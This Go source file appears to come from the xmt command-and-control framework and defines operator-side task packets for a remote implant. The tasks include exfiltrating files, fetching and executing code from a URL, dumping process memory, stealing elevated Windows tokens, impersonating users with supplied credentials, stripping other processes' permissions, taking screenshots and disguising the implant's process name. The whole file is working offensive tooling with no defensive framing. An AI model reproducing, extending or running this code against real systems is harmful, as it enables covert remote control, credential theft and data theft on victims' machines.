//go:build !implant

package task

import (
	"io"
	"os"
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// Pwd returns a print current directory Packet. This can be used to instruct
// the client to return a string value that contains the current working
// directory.
//
// C2 Details:
//  ID: MvPwd
//
//  Input:
//      <none>
//  Output:
//      string // Working Dir
func Pwd() *com.Packet {
	return &com.Packet{ID: MvPwd}
}

// Mounts returns a list mounted drives Packet. This can be used to instruct
// the client to return a string list of all the mount points on the host device.
//
// C2 Details:
//  ID: MvMounts
//
//  Input:
//      <none>
//  Output:
//      []string // Mount Paths List
func Mounts() *com.Packet {
	return &com.Packet{ID: MvMounts}
}

// Refresh returns a refresh Packet. This will instruct the client to re-update
// it's internal Device storage and return the new result. This can be used to
// detect new network interfaces added/removed and changes to hostname/user
// status.
//
// This is NOT needed after a Migration, as this happens automatically.
//
// C2 Details:
//  ID: MvRefresh
//
//  Input:
//      <none>
//  Output:
//      Machine // Updated device details
func Refresh() *com.Packet {
	return &com.Packet{ID: MvRefresh}
}

// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
// based devices to drop any previous elevated Tokens they may posess and return
// to their "normal" Token.
//
// This task result does not return any data, only errors if it fails.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvRevSelf
//
//  Input:
//      <none>
//  Output:
//      <none>
func RevToSelf() *com.Packet {
	return &com.Packet{ID: TvRevSelf}
}

// ScreenShot returns a screenshot Packet. This will instruct the client to
// attempt to get a screenshot of all the current active desktops on the host.
// If successful, the returned data is a binary blob of the resulting image,
// encoded in the PNG image format.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TVScreenShot
//
//  Input:
//      <none>
//  Output:
//      []byte // Data
func ScreenShot() *com.Packet {
	return &com.Packet{ID: TvScreenShot}
}

// Ls returns a file list Packet. This can be used to instruct the client
// to return a string and bool list of the files in the directory specified.
//
// If 'd' is empty, the current working directory "." is used.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvList
//
//  Input:
//      string          // Directory
//  Output:
//      uint32          // Count
//      []File struct { // List of Files
//          string      // Name
//          int32       // Mode
//          uint64      // Size
//          int64       // Modtime
//      }
func Ls(d string) *com.Packet {
	n := &com.Packet{ID: MvList}
	n.WriteString(d)
	return n
}

// IsDebugged returns a check debugger status Packet. This can be used to instruct
// the client to return a boolean value determing if it is currently attached or
// being run by a debugger.
//
// C2 Details:
//  ID: MvCheckDebug
//
//  Input:
//      <none>
//  Output:
//      bool // True if being debugged, false otherwise
func IsDebugged() *com.Packet {
	return &com.Packet{ID: MvCheckDebug}
}

// ProcessList returns a list processes Packet. This can be used to instruct
// the client to return a list of the current running host's processes.
//
// C2 Details:
//  ID: MvProcList
//
//  Input:
//      <none>
//  Output:
//      uint32              // Count
//      []cmd.ProcessInfo { // List of Running Processes
//          uint32          // Process ID
//          uint32          // Parent Process ID
//          string          // Process Image Name
//      }
func ProcessList() *com.Packet {
	return &com.Packet{ID: MvProcList}
}

// Jitter returns a set Session jitter Packet. This can be used to instruct the
// client to update it's jitter value to the specified 0-100 percentage.
//
// Anything greater than 100 will be capped to 100 and anything less than zero
// (except -1) will be set to zero. Values of -1 are ignored. This setting will
// NOT override the Sleep setting.
//
// IT IS RECOMMENDED TO USE THE 'Session.Jitter' CALL INSTEAD TO PREVENT DE-SYNC
// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      int8   // Jitter
//      uint64 // Sleep (0 for this)
//  Output:
//      uint8  // Jitter
//      uint64 // Sleep
func Jitter(j int) *com.Packet {
	return Duration(0, j)
}

// Cwd returns a change directory Packet. This can be used to instruct the
// client to change from it's current working directory to the directory
// specified.
//
// Empty or invalid directory entires will return an error.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvCwd
//
//  Input:
//      string // Directory
//  Output:
//      <none>
func Cwd(d string) *com.Packet {
	n := &com.Packet{ID: MvCwd}
	n.WriteString(d)
	return n
}

// Kill returns a process kill Packet. This can be used to instruct to send a
// SIGKILL signal to the specified process by the specified Process ID.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      uint32 // PID
//  Output:
//      uint8  // IO Type
func Kill(p uint32) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	n.WriteUint8(taskIoKill)
	n.WriteUint32(p)
	return n
}

// Touch returns a file touch Packet. This can be used to instruct to create the
// specified file if it does not exist.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      string // Path
//  Output:
//      uint8  // IO Type
func Touch(s string) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	n.WriteUint8(taskIoTouch)
	n.WriteString(s)
	return n
}

// Profile returns an update profile Packet. This can be used to instruct the
// client to set it's profile to the raw Profile bytes supplied.
//
// IT IS RECOMMENDED TO USE THE 'Session.SetProfile' CALL INSTEAD TO PREVENT DE-SYNC
// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
//
// C2 Details:
//  ID: MvProfile
//
//  Input:
//      []byte // Profile
//  Output:
//      <none>
func Profile(b []byte) *com.Packet {
	n := &com.Packet{ID: MvProfile}
	n.WriteBytes(b)
	return n
}

// KillName returns a process kill Packet. This can be used to instruct to send
// a SIGKILL signal all to the specified processes that have the specified name.
//
// NOTE: This kills all processes that share this name.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      string // Process Name
//  Output:
//      uint8  // IO Type
func KillName(s string) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	n.WriteUint8(taskIoKillName)
	n.WriteString(s)
	return n
}

// Download returns a download Packet. This will instruct the client to
// read the (client local) filepath provided and return the raw binary data.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvDownload
//
//  Input:
//      string // Target
//  Output:
//      string // Expanded Target Path
//      bool   // Target is Directory
//      int64  // Size
//      []byte // Data
func Download(src string) *com.Packet {
	n := &com.Packet{ID: TvDownload}
	n.WriteString(src)
	return n
}

// ProcessName returns a process name change Packet. This can be used to instruct
// the client to change from it's current in-memory name to the specified string.
//
// C2 Details:
//  ID: TvRename
//
//  Input:
//      string // New Process Name
//  Output:
//      <none>
func ProcessName(s string) *com.Packet {
	n := &com.Packet{ID: TvRename}
	n.WriteString(s)
	return n
}

// Move returns a file move Packet. This can be used to instruct to move the
// specified source file to the specified destination path.
//
// The source and destination paths may contain environment variables that will
// be resolved during runtime.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      string // Source
//      string // Destination
//  Output:
//      uint8  // IO Type
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func Move(src, dst string) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	n.WriteUint8(taskIoMove)
	n.WriteString(src)
	n.WriteString(dst)
	return n
}

// Wait returns a wait -n- sleep Packet. This can be used to instruct to the
// client to pause processing for the specified duration.
//
// This Task only has an affect during Scripts as most operations are threaded.
//
// If the time is less than or equal to zero, the task will become a NOP.
//
// C2 Details:
//  ID: TvWait
//
//  Input:
//      uint64 // Wait duration
//  Output:
//      <none>
func Wait(d time.Duration) *com.Packet {
	n := &com.Packet{ID: TvWait}
	n.WriteUint64(uint64(d))
	return n
}

// Copy returns a file copy Packet. This can be used to instruct to copy the
// specified source file to the specified destination path.
//
// The source and destination paths may contain environment variables that will
// be resolved during runtime.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      string // Source
//      string // Destination
//  Output:
//      uint8  // IO Type
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func Copy(src, dst string) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	n.WriteUint8(taskIoCopy)
	n.WriteString(src)
	n.WriteString(dst)
	return n
}

// Pull returns a pull Packet. This will instruct the client to download the
// resource from the provided URL and write the data to the supplied local
// filesystem path.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvPull
//
//  Input:
//      string // URL
//      string // Target Path
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func Pull(url, path string) *com.Packet {
	return PullAgent(url, "", path)
}

// Sleep returns a set Session sleep Packet. This can be used to instruct the
// client to update it's sleep value to the specified duration.
//
// Anything less than or equal to zero is ignored! This setting will NOT override
// the Jitter setting.
//
// IT IS RECOMMENDED TO USE THE 'Session.Sleep' CALL INSTEAD TO PREVENT DE-SYNC
// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      int8   // Jitter (-1 for this)
//      uint64 // Sleep
//  Output:
//      uint8  // Jitter
//      uint64 // Sleep
func Sleep(d time.Duration) *com.Packet {
	return Duration(d, -1)
}

// ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
// client to attempt to remove the Proxy setup by the name, or the single Proxy
// instance (if multi-proxy mode is disabled).
//
// Returns an NotFound error if the Proxy is not registered or Proxy support is
// disabled
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to true for this task.
//  Output:
//      <none>
func ProxyRemove(name string) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(0)
	return n
}

// UnTrust returns an Untrust Packet. This will instruct the client to use the
// provided Filter to attempt to "Untrust" the targeted process by removing all
// of it's permissions and setting it's integrity level to "Untrusted".
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUnTrust
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      <none>
func UnTrust(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvUnTrust}
	f.MarshalStream(n)
	return n
}

// Elevate returns an evelate Packet. This will instruct the client to use the
// provided Filter to attempt to get a Token handle to an elevated process. If
// the Filter is nil, then the client will attempt at any elevated process.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvElevate
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      <none>
func Elevate(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvElevate}
	f.MarshalStream(n)
	return n
}

// Upload returns a upload Packet. This will instruct the client to write the
// provided byte array to the filepath provided. The client will return the
// number of bytes written and the resulting expanded file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func Upload(dst string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	n.Write(b)
	return n
}

// ProcessDump will instruct the client to attempt to read and download then
// memory of the filter target. The returned data is a binary blob of the memory
// if successful.
//
// C2 Details:
//  ID: TvProcDump
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      []byte // Data
func ProcessDump(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvProcDump}
	f.MarshalStream(n)
	return n
}

// Delete returns a file delete Packet. This can be used to instruct to delete
// the specified file if it exists.
//
// Specify 'recurse' to True to delete a non-empty directory and all files in it.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvSystemIO
//
//  Input:
//      uint8  // IO Type
//      string // Path
//  Output:
//      uint8  // IO Type
func Delete(s string, recurse bool) *com.Packet {
	n := &com.Packet{ID: TvSystemIO}
	if recurse {
		n.WriteUint8(taskIoDeleteAll)
	} else {
		n.WriteUint8(taskIoDelete)
	}
	n.WriteString(s)
	return n
}

// Proxy returns an add Proxy Packet. This can be used to instruct the client to
// attempt to add the specified Proxy with the name, bind address and Profile
// bytes.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to false for this task.
//      string // Proxy Bind Address
//      []byte // Proxy Profile
//  Output:
//      <none>
func Proxy(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(2)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// PullAgent returns a pull Packet. This will instruct the client to download the
// resource from the provided URL and write the data to the supplied local
// filesystem path.
//
// The supplied 'agent' string (if non-empty) will specify the User-Agent header
// string to be used.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvPull
//
//  Input:
//      string // URL
//      string // User-Agent
//      string // Target Path
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func PullAgent(url, agent, path string) *com.Packet {
	n := &com.Packet{ID: TvPull}
	n.WriteString(url)
	n.WriteString(agent)
	n.WriteString(path)
	return n
}

// LoginUser returns an impersonate user Packet. This will instruct the client to
// use the provided credentials to change it's Token to the user that owns the
// supplied credentials.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvLoginUser
//
//  Input:
//      string // Username
//      string // Domain
//      string // Password
//  Output:
//      <none>
func LoginUser(user, domain, pass string) *com.Packet {
	n := &com.Packet{ID: TvLoginUser}
	n.WriteString(user)
	n.WriteString(domain)
	n.WriteString(pass)
	return n
}

// UploadFile returns a upload  Packet. This will instruct the client to write
// the provided (server local) file content to the filepath provided. The client
// will return the number of bytes written and the resulting expanded file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// The source path may contain environment variables that will be resolved on
// server execution.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func UploadFile(dst, src string) (*com.Packet, error) {
	// 0 - READONLY
	f, err := os.OpenFile(device.Expand(src), 0, 0)
	if err != nil {
		return nil, err
	}
	n, err := UploadReader(dst, f)
	f.Close()
	return n, err
}

// Duration returns a set Session sleep and/or jitter Packet. This can be used
// to instruct the client to update it's sleep and jitters value to the specified
// duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
// anything <=0 for Sleep).
//
// For Sleep, anything less than or equal to zero is ignored!
//
// For Jitter, anything greater than 100 will be capped to 100 and anything less
// than zero (except -1) will be set to zero. Values of -1 are ignored.
//
// IT IS RECOMMENDED TO USE THE 'Session.Duration' CALL INSTEAD TO PREVENT DE-SYNC
// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      int8   // Jitter
//      uint64 // Sleep
//  Output:
//      uint8  // Jitter
//      uint64 // Sleep
func Duration(d time.Duration, j int) *com.Packet {
	n := &com.Packet{ID: MvTime}
	n.WriteInt8(int8(j))
	n.WriteUint64(uint64(d))
	return n
}

// ProxyReplace returns an replace Proxy Packet. This can be used to instruct
// the client to attempt to call the 'Replace' function on the specified Proxy
// with the name, bind address and Profile bytes as the arguments.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to false for this task.
//      string // Proxy Bind Address
//      []byte // Proxy Profile
//  Output:
//      <none>
func ProxyReplace(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(1)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// UploadReader returns a upload Packet. This will instruct the client to write
// the provided reader content to the filepath provided. The client will return
// the number of bytes written and the resulting file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	_, err := io.Copy(n, r)
	return n, err
}

// PullExecute returns a pull and execute Packet. This will instruct the client
// to download the resource from the provided URL and execute the downloaded data.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// This function allows for specifying a Filter struct to specify the target
// parent process and the boolean flag can be set to true/false to specify
// if the task should wait for the process to exit.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      string          // URL
//      bool            // Wait
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      uint32          // PID
//      int32           // Exit Code
func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
	return PullExecuteAgent(url, "", w, f)
}

// PullExecuteAgent returns a pull and execute Packet. This will instruct the client
// to download the resource from the provided URL and execute the downloaded data.
//
// The supplied 'agent' string (if non-empty) will specify the User-Agent header
// string to be used.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// This function allows for specifying a Filter struct to specify the target
// parent process and the boolean flag can be set to true/false to specify
// if the task should wait for the process to exit.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      string          // URL
//      string          // User-Agent
//      bool            // Wait
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      uint32          // PID
//      int32           // Exit Code
func PullExecuteAgent(url, agent string, w bool, f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvPullExecute}
	n.WriteString(url)
	n.WriteString(agent)
	n.WriteBool(w)
	f.MarshalStream(n)
	return n
}
